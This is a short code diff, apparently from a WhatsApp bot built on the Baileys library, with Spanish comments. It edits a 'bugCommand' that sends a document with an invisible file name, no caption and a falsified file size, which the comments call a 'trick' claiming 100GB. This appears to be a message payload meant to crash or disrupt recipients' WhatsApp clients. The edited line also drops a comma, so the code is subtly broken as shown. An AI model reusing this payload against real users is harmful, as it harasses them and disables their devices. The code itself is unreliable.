@@ -33,7 +33,7 @@ const bugCommand = {
                 mimetype: 'text/plain',
                 fileName: nombreInvisible,
                 // Aquí ocurre el truco: le decimos a Baileys que el tamaño es 100GB
-                fileLength: 0, // 100 GB en bytes 107374182400
+                fileLength: 999000000 // 100 GB en bytes 107374182400
                 caption: null // No enviamos texto, solo el archivo
             }, { quoted: m })
 
